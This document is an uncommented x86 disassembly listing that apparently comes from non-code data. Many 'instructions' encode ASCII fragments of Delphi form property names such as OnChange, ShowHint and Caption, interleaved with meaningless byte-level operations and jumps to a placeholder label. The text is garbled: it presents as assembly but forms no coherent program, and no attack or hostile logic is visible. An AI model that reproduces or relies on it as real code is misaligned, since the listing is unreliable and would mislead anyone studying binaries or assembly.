or [ ebx + 0x6f ] al
jne r-xdata
outsb
adc [ ebp + edx * 2 + 0x70 ] dl
inc esp
outsd
ja r-xdata
js r-xdata
add [ ebx ] ecx
inc ecx
insb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0xb ] si
add [ eax + 0x4f ] dh
inc ebx
add [ edi + ecx * 2 + 0x2400043 ] bl
add [ eax ] al
dec esp
sub eax [ eax + eax - 0x24 ]
cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add ah cl
popad
insb
jne r-xdata
insb
outsd
ja r-xdata
or eax [ ecx + 0x6c ]
push 0x65676e61
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] ch
inc eax
add [ eax ] al
adc [ eax ] al
mov eax eax
loopne r-xdata
inc ebx
add [ ebx ] al
or dl [ ebp + edx * 2 + 0x44 ]
insb
imul esp [ ebx + 0x6b ] 0x6e657645
je r-xdata
rcl [ ebp + ecx * 2 + 0x43 ] 0x0
or [ 0x43445554 ] cl
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
push ebp
inc esp
inc ebx
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al bl
dec esp
inc ebx
add [ esi ] al
bound esi [ esi + ecx * 2 + 0x65 ]
js r-xdata
jbe r-xdata
insb
insd
inc ebx
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x6f430874
add [ eax + ecx * 4 ] dl
inc esp
add [ edi + edx * 4 + 0x43 ] bh
add [ eax - 0x70 ] cl
inc esp
add [ ebp + 0x44 ] cl
add ah dh
cmovb eax [ eax ]
fmul [ edx + eax * 2 ]
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
movsb [ edi ] [ esi ]
nop
inc ebx
add [ eax - 0x63ffbb2a ] al
fild [ eax + eax - 0x18 ]
fiadd [ eax + eax - 0x58 ]
pop edx
inc esp
add ah bh
rol [ eax + eax + 0x1c ] 0x1
rol [ eax + eax + 0x34 ] 0x1
into
inc esp
add al dh
pop ecx
inc esp
add ah dh
pop ecx
inc esp
add ah ah
mov [ eax + eax + 0x10 ] eax
mov al [ eax + eax + 0x34 ]
inc esp
add [ ebx + ebx * 2 + 0x44 ] ch
add al al
inc sp
add [ eax ] bh
inc sp
add [ ecx + ebp * 2 + 0x44 ] cl
add al bh
inc esp
add [ eax - 0x56 ] ch
inc esp
add [ edx + ecx * 4 - 0x3177ffbc ] dl
inc esp
add [ edi + ecx * 8 + 0x44 ] al
add [ eax - 0x36 ] al
inc esp
add [ eax ] ch
iretd
add [ ebx + ecx * 4 + 0x41 ] cl
inc esp
imul esi [ edx + 0x65 ] 0x6f697463
outsb
add [ ecx + edx ] ch
inc eax
add [ eax ] al
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + edx ] bh
push 0x65676e61
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax ] cl
dec esi
ja r-xdata
inc esp
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ esi + ecx * 4 - 0x2493ffbc ] ah
inc esp
add [ ebx - 0x74b3ffbc ] dl
inc ecx
inc edx
add [ esp + esi + 0x9300040 ] ch
inc edx
add [ esp + esi - 0x5433ffc0 ] dh
or [ ebx + 0x6d ] dl
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x69440900
jb r-xdata
inc ebx
add [ eax ] cl
adc dl [ ebp + edx * 2 + 0x44 ]
inc ebx
push 0x69676e61
add [ esi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
push es
bound esi [ eax + edx * 2 + 0x72 ]
adc [ ebp + 0x43 ] cl
inc ebx
stosd [ edi ]
arpl [ ecx + ebp * 2 + 0x6f ] si
sub_434f32
inc esp
add al al
nop
inc esp
add [ edi + edx * 4 + 0x44 ] dl
add ah dh
movsb [ edi ] [ esi ]
inc esp
add [ eax - 0x6f ] dh
inc ebx
add ah bl
mov eax [ 0xffffffff92040044 ]
inc ebx
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add al dh
mov [ 0xffffffffd0680044 ] eax
inc esp
add [ eax ] bh
scasb [ edi ]
inc esp
add [ edx + 0x44 ] bl
add ah ah
int3
sub_4350aa
inc esp
add al al
nop
inc esp
add [ edi + edx * 4 + 0x44 ] dl
add ah dh
movsb [ edi ] [ esi ]
inc esp
add [ eax - 0x6f ] dh
inc ebx
add ah bl
mov eax [ 0xffffffff92040044 ]
inc ebx
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add al dh
mov [ 0xffffffffd0680044 ] eax
inc esp
add [ eax ] bh
scasb [ edi ]
inc esp
add [ edx + 0x44 ] bl
add ah ah
int3
sub_4350e6
inc esp
add [ edi ] al
push esp
push ebp
jo r-xdata
outsb
inc edx
jne r-xdata
outsd
ja r-xdata
je r-xdata
or al 0x2
hlt
push eax
add [ eax ] al
outsb
sbb [ ebx ] 0x44
add [ ecx ] ah
add bh bh
mov eax 0x5400445a
pop ebx
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add al 0x98
outsd
arpl [ ecx + 0x61 ] bp
je r-xdata
add [ eax ] al
call [ edi + eax * 4 + 0x44 ]
add [ eax - 0x80000000 ] al
pop es
add [ eax + ecx * 2 ] al
imul ebp [ esi + 0x74 ] r-xdata
adc [ edx ] al
add bh bh
add bh bh
sbb al 0x95
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4109000d ] al
jae r-xdata
add [ edi ] ch
inc esp
add [ edx + eax ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al 0x0
or ecx [ edi + 0x72 ]
imul esp [ ebp + 0x6e ] 0x69746174
outsd
outsb
add [ eax ] dl
inc eax
add [ edx - 0x27010000 ] bl
push 0x10044
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
adc eax 0x61500e00
jb r-xdata
adc [ eax ] al
adc al 0x2
add bh bh
xchg esp eax
cwde
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
add ecx [ ebp + 0x69 ]
outsb
cmp al 0x10
inc eax
add [ edx ] dl
add al [ eax ]
dec [ eax + ebx * 4 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax + eax ] 0x0
adc [ eax ] eax
add ecx [ ebp + 0x61 ]
js r-xdata
cmp al 0x10
inc eax
add [ eax ] dl
add al [ eax ]
inc [ eax + ebx * 4 ]
add [ eax ] dl
inc eax
add [ eax ] cl
add al [ eax ]
add [ eax ] al
outsb
je r-xdata
add [ ecx ] ch
add al [ eax ]
dec esp
cdq
inc ebx
sbb al 0x44
add [ eax + eax ] dh
[ esp + ecx * 4 ]
add [ eax ] al
cmp bh 0xff
sbb eax [ eax + eax - 0x10 ]
rol [ eax + eax + 0x70 ] 0x1
rol [ eax + eax + 0x1 ] cl
add [ eax ] al
add [ eax ] al
add [ eax + 0x53080018 ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
push [ eax + ebp * 2 + 0x687c0044 ]
inc esp
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc esp
add [ eax + ebp * 2 + 0x44 ] bh
pop ecx
inc ebp
add [ eax + eax ] bh
[ edi ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090016 ] al
outsd
jo r-xdata
dec [ eax + 0x10044d2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
jo r-xdata
adc [ eax ] al
push ds
outsb
jne r-xdata
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
adc [ eax ] al
int3
add al [ eax ]
add [ eax ] dl
inc eax
add [ esi ] bl
imul ebp [ esi + 0x74 ] r-xdata
sub_4351b0
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sldt [ edi ]
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
lodsb [ esi ]
adc [ eax ] al
add [ eax ] 0x0
inc [ eax - 0x6b010000 ]
xchg [ eax + eax ] eax
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040007 ] al
imul ebp [ esi + 0x74 ] r-xdata
adc [ edx ] al
add bh bh
add al 0x98
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
add ecx [ ebp + 0x69 ]
outsb
cmp al 0x10
inc eax
add [ edx ] dl
add al [ eax ]
dec [ eax + ebx * 4 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax + eax ] 0x0
adc [ eax ] eax
add ecx [ ebp + 0x61 ]
js r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al 0x0
or ecx [ edi + 0x72 ]
imul esp [ ebp + 0x6e ] 0x69746174
outsd
outsb
add [ eax ] dl
inc eax
add [ edx - 0x27010000 ] bl
push 0x10044
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
adc eax 0x61500e00
jb r-xdata
adc [ eax ] al
adc al 0x2
add bh bh
xchg esp eax
cwde
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
add [ eax ] al
outsb
je r-xdata
add [ ecx ] ch
add al [ eax ]
dec esp
cdq
inc ebx
sbb al 0x44
add [ eax + eax ] dh
[ esp + ecx * 4 ]
add [ eax ] al
cmp bh 0xff
sbb eax [ eax + eax - 0x10 ]
rol [ eax + eax + 0x70 ] 0x1
rol [ eax + eax + 0x1 ] cl
add [ eax ] al
add [ eax ] al
add [ eax + 0x53080018 ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
push [ eax + ebp * 2 + 0x687c0044 ]
inc esp
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc esp
add [ eax + ebp * 2 + 0x44 ] bh
pop ecx
inc ebp
add [ eax + eax ] bh
[ edi ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090016 ] al
outsd
jo r-xdata
dec [ eax + 0x10044d2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
jo r-xdata
adc [ eax ] al
push ds
outsb
jne r-xdata
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
adc [ eax ] al
int3
add al [ eax ]
add [ eax ] dl
inc eax
add [ esi ] bl
imul ebp [ esi + 0x74 ] r-xdata
sub_4353f9
cmp [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ edi + ecx * 2 ] cl
outsb
inc ebx
push 0x69676e61
outsb
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0020 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
and al 0x44
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
push es
dec edi
js r-xdata
outsb
dec ebp
outsd
jne r-xdata
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
push eax
outsd
jo r-xdata
jns r-xdata
push ebp
jo r-xdata
add bh bh
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
dec ebp
outsd
jne r-xdata
sbb al 0x44
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
push 0x6746669
inc esp
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0024 ] al
outsb
jo r-xdata
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ ebp + edx * 2 + 0x43 ] dh
add [ esi ] al
push 0x6e6f4e63
pop es
push 0x69685363
je r-xdata
add [ eax ] al
inc ebp
js r-xdata
rcr [ edx * 2 + 0xb030043 ] 0x54
dec eax
dec ebx
dec ebp
outsd
imul esp [ fs : esi + 0x69 ] 0x17265
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] bl
push ebp
inc ebx
add [ edi ] al
push 0x6968536b
je r-xdata
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
push 0x7478456b
pop esp
sbb eax 0xd80044
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0b00
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060023 ] al
dec ebp
inc ebx
add [ eax ] ah
add al [ eax ]
jmp [ eax ]
add eax 0x6c416368
je r-xdata
push 0x72744363
insb
add eax 0x6c416b68
je r-xdata
push 0x7274436b
insb
inc ebx
je r-xdata
insb
push es
dec ebp
outsd
jbe r-xdata
or ch [ eax + 0x63 ]
push ebx
push 0x41746669
push 0x69685363
je r-xdata
add [ esp + esi - 0x5433ffc0 ] dh
insb
inc ecx
insb
je r-xdata
dec ebp
outsd
jne r-xdata
or ecx [ edi + 0x6e ]
or al 0x54
dec eax
dec ebx
dec ebp
outsd
imul esp [ fs : esi + 0x69 ] 0x1737265
sbb [ ebp + 0x43 ] dl
add [ eax + r-xdata ] dl
add ecx [ 0x494b4854 ]
shl [ eax + 0x55 ] 0x43
add [ esi ] al
outsd
add [ eax ] al
pop es
insb
imul esp [ ebx + ecx * 2 + 0x65 ] 0x179
jb r-xdata
in al 0x1c
inc esp
add al ah
add [ eax ] al
jmp eax
push cs
push 0x72744363
dec ebx
jns r-xdata
je r-xdata
insd
inc ebx
je r-xdata
or [ ebx + 0x6f ] al
push 0x69685363
je r-xdata
inc ecx
mov [ 0xffffffff8b4c0044 ] eax
insb
jae r-xdata
insb
je r-xdata
jae r-xdata
inc esp
add [ eax ] cl
xor al [ eax ]
and al 0x32
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 2 ] bl
inc ebx
add [ edi + edx * 2 ] ah
inc ebx
add [ eax ] bl
je r-xdata
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
xor [ ebx - 0x297fffbd ] bl
inc esp
add [ ebx + ebx * 8 - 0x2517ffbc ] bl
inc esp
add [ eax - 0x3ffbba6 ] ch
rol [ eax + eax + 0x1c ] 0x1
rol [ eax + eax + 0x34 ] 0x1
into
inc esp
add al dh
pop ecx
inc esp
add ah dh
pop ecx
inc esp
add ah ah
mov [ eax + eax + 0x10 ] eax
mov al [ eax + eax + 0x64 ]
pushfd
inc ebx
add [ ebx + ebx * 2 + 0x44 ] ch
add al al
inc sp
add [ eax ] bh
inc sp
add [ ecx + ebp * 2 + 0x44 ] cl
add al bh
inc esp
add [ eax - 0x56 ] ch
inc esp
add [ edx + ecx * 4 - 0x3177ffbc ] dl
inc esp
add [ edi + ecx * 8 + 0x44 ] al
add [ eax - 0x36 ] al
inc esp
add [ eax ] ch
iretd
add ah bl
or al 0x42
add [ ebp + edx * 2 + 0x43 ] esi
add al [ eax ]
add [ ebx + ebp + 0x44 ] cl
add ah bl
cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add ah cl
stosd [ edi ]
insb
outsb
jbe r-xdata
add [ ebx ] al
or eax 0x494b4854
inc eax
add al dh
push ebp
inc ebx
add [ esi ] al
push cs
push esp
dec eax
dec ebx
dec ecx
outsb
jbe r-xdata
inc eax
add [ esi + ecx * 4 - 0x2493ffbc ] ah
inc esp
add [ ebx - 0x74b3ffbc ] dl
insb
inc ecx
insb
je r-xdata
add [ eax + ecx * 4 ] dl
inc esp
add [ esp + ebx * 2 ] dh
inc esp
add [ eax - 0x70 ] cl
inc esp
add [ ebp + 0x44 ] cl
add ah dh
cmovb eax [ eax ]
fmul [ edx + eax * 2 ]
inc esp
add [ ebx + ecx * 4 + 0x41 ] cl
add [ ebp + 0x56540040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
push edi
inc ebx
add [ eax ] al
insb
imul esp [ ebx + ecx * 2 + 0x65 ] 0x74017379
push ebp
inc ebx
lea eax [ eax ]
inc ebx
sub_4356de
inc esp
add al al
nop
inc esp
add [ edi + edx * 4 + 0x44 ] dl
add ah dh
movsb [ edi ] [ esi ]
inc esp
add ah al
fwait
inc ebx
add ah bl
mov eax [ 0xffffffff9c040044 ]
inc ebx
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add al dh
mov [ 0xffffffffd0680044 ] eax
inc esp
add [ eax ] bh
scasb [ edi ]
inc esp
add [ edx + 0x44 ] bl
add ah ah
int3
sub_435832
inc esp
add al al
nop
inc esp
add [ edi + edx * 4 + 0x44 ] dl
add ah dh
movsb [ edi ] [ esi ]
inc esp
add ah al
fwait
inc ebx
add ah bl
mov eax [ 0xffffffff9c040044 ]
inc ebx
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add al dh
mov [ 0xffffffffd0680044 ] eax
inc esp
add [ eax ] bh
scasb [ edi ]
inc esp
add [ edx + 0x44 ] bl
add ah ah
int3
sub_4358a2
mov eax 0x5400445a
pop ebx
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax ] dl
inc eax
add [ eax ] cl
add al [ eax ]
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
or [ ecx + 0x75 ] al
je r-xdata
lodsb [ esi ]
adc [ eax ] al
add [ eax ] 0x0
inc [ eax - 0x6b010000 ]
xchg [ eax + eax ] eax
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040007 ] al
imul ebp [ esi + 0x74 ] r-xdata
pop eax
popfd
inc ebx
add [ ebp + ebx * 4 + 0x43 ] bh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] dl
add [ esi ] al
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
mov [ eax + 0x44 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000d ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x2865646f
sbb al 0x44
add [ eax + eax ] dh
[ esp + ecx * 4 ]
jae r-xdata
jns r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
dec eax
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x41 ] al
adc [ eax ] al
push es
push ebp
inc ebx
add [ edx ] cl
add al [ eax ]
sub_43590c
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000e ] al
outsd
outsb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
adc [ eax ] eax
or ecx [ ecx + 0x6e ]
jbe r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al 0x0
push cs
push eax
popad
jb r-xdata
insb
imul esp [ ebx + ecx * 2 + 0x65 ] 0x555c7379
inc ebx
add [ ecx ] cl
add al [ eax ]
outsd
je r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] dl
add dh bh
add [ fs : eax ] al
outsb
je r-xdata
jae r-xdata
jns r-xdata
rol [ eax + eax + 0x70 ] 0x1
rol [ eax + eax + 0x1 ] cl
push 0x6948776f
outsb
je r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x41 ] al
adc [ eax ] al
push es
dec eax
push ebp
inc ebx
add [ edx ] cl
add al [ eax ]
add [ eax ] al
add [ eax ] al
inc esp
add [ ecx ] al
pop ecx
inc ebp
add [ eax + eax ] bh
[ edi ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090015 ] al
outsd
jo r-xdata
test [ esi + 0x44 ] ah
add ah dl
xchg [ eax + eax ] eax
jo r-xdata
dec edi
js r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
dec [ eax + 0x10044d2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] al
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
outsb
or eax 0x46697661
inc esp
outsd
ja r-xdata
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
push eax
outsd
jo r-xdata
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0x54656c62
pop eax
inc ecx
add [ eax ] dl
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08001a ] al
outsb
inc ebx
push 0x65676e61
or al 0x24
inc esp
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e001b ] al
outsb
inc ebx
outsd
outsb
je r-xdata
adc [ eax ] al
push edi
add [ eax ] al
inc [ esi - 0x782bffbc ]
inc esp
add [ eax ] al
adc [ eax ] al
cdq
add [ eax ] al
push [ eax + ebp * 2 + 0x687c0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080016 ] al
push 0x6948776f
outsb
je r-xdata
punpcklwd mm6 [ esi + 0x69 ]
popad
jbe r-xdata
pop esp
sbb eax 0xd80044
insd
jo r-xdata
dec ebp
outsd
jbe r-xdata
outsb
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b001f ] al
jo r-xdata
add [ eax ] al
cmp bh 0xff
sbb eax [ eax + eax - 0x10 ]
pop ebp
inc ebx
add [ eax + 0x2 ] ah
add [ eax ] al
dec esp
sub eax [ eax + eax - 0x24 ]
cmovb eax [ eax ]
jb r-xdata
rcr [ ebx + eax * 2 ] 0x0
inc esi
imul ebp [ esi + 0x64 ] 0x656c6946
je r-xdata
popad
jbe r-xdata
in al 0x1c
inc esp
add al ah
add [ eax ] al
jmp eax
add [ eax - 0x80000000 ] al
push ds
add [ ebx ] cl
pop eax
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07001c ] al
outsb
inc ebp
outsb
je r-xdata
or esp [ ecx + 0x76 ]
imul eax [ ebx + 0x6f ] 0x69467970
insb
push cs
popad
jbe r-xdata
popad
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x21ffbca3 ] dh
jb r-xdata
pop ebp
inc ebx
cwde
pop ebp
inc ebx
add ah ch
inc esi
imul ebp [ esi + 0x64 ] 0x706d6f43
jne r-xdata
dec ebp
outsd
jne r-xdata
jb r-xdata
or [ edx ] eax
mov ah 0x34
inc eax
add ah cl
push edx
mov dl 0x5d
inc ebx
add dh bl
inc ebx
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ ebx ] cl
dec edi
pop eax
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06001d ] al
outsb
add [ eax + 0x340043a4 ] al
pop esp
inc esp
add [ eax - 0x70 ] cl
inc esp
add [ ebp + 0x44 ] cl
add ah dh
cmovb eax [ eax ]
fmul [ edx + eax * 2 ]
add [ ebx + ecx * 4 + 0x41 ] cl
jns r-xdata
lodsb [ esi ]
xor al 0x40
inc esi
imul ebp [ ebp + 0x73 ] 0x6976610b
inc ebx
outsd
jo r-xdata
outsb
dec ebp
outsd
jne r-xdata
je r-xdata
add [ eax ] dh
arpl [ gs : ecx + 0x63 ] di
insb
or eax 0x44697661
insb
je r-xdata
stosd [ edi ]
arpl [ gs : ecx + 0x63 ] di
inc esi
imul ebp [ ebp + 0xe ] 0x52697661
jns r-xdata
push ebp
jo r-xdata
inc ebp
js r-xdata
add bh bh
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax 0x6e4f0600
outsb
dec ebp
outsd
jne r-xdata
sbb al 0x44
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b001e ] al
inc ecx
inc esi
inc esp
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ esi + ecx * 4 - 0x2493ffbc ] ah
inc esp
add [ ebx - 0x74b3ffbc ] dl
xor [ ecx ] cl
inc edx
add [ esp + esi - 0x5433ffc0 ] dh
insb
inc esi
imul ebp [ ebp + 0xf ] 0x45697661
insd
jo r-xdata
fcomp [ ebx + 0x43 ]
add [ ebx ] al
or dl [ ebx + eax * 2 + 0x6f ]
insd
insd
outsd
outsb
inc ecx
push esi
dec ecx
add [ eax ] eax
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add ah dl
pop ebx
inc ebx
add [ edi ] al
popad
jbe r-xdata
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
mov [ edi - 0x297fffbd ] ds
inc esp
add [ eax - 0x17ffbc55 ] dh
fiadd [ eax + eax - 0x58 ]
pop edx
inc esp
add ah bh
rol [ eax + eax + 0x1c ] 0x1
rol [ eax + eax + 0x34 ] 0x1
into
inc esp
add al dh
pop ecx
inc esp
add ah dh
pop ecx
inc esp
add ah ah
mov [ eax + eax + 0x10 ] eax
mov al [ eax + eax + 0x34 ]
inc esp
add [ ebx + ebx * 2 + 0x44 ] ch
add al al
inc sp
add [ eax ] bh
inc sp
add [ ecx + ebp * 2 + 0x44 ] cl
add al bh
inc esp
add [ eax - 0x56 ] ch
inc esp
add [ edx + ecx * 4 - 0x3177ffbc ] dl
inc esp
add [ edi + ecx * 8 + 0x44 ] al
add [ eax - 0x36 ] al
inc esp
add [ eax ] ch
iretd
inc edx
insb
jae r-xdata
imul ebp [ ebp + 0x8 ] 0x436d6f43
je r-xdata
imul eax [ ebp + 0x6c ] 0x46657465
dec esi
outsd
imul ebp [ esi + 0x64 ] 0x646c6f46
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x13ffbca3 ] bl
rol al 0x5c
inc ebx
add [ eax ] al
sub_4359ba
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ edx ] dl
add [ ecx ] cl
dec ebp
outsd
imul esp [ fs : esi + 0x69 ] 0x737265
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
sub_435bb8
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090020 ] al
outsb
dec ebp
outsd
jne r-xdata
jns r-xdata
push ebp
jo r-xdata
xor [ ecx ] cl
inc edx
add [ esp + esi - 0x5433ffc0 ] dh
insb
inc esi
imul ebp [ ebp + 0xf ] 0x45697661
insd
jo r-xdata
sbb al 0x44
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b001e ] al
outsb
dec ebp
outsd
jne r-xdata
fcomp [ ebx + 0x43 ]
add [ ebx ] al
or dl [ ebx + eax * 2 + 0x6f ]
insd
insd
outsd
outsb
inc ecx
push esi
dec ecx
add [ eax ] eax
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add ah dl
pop ebx
inc ebx
add [ edi ] al
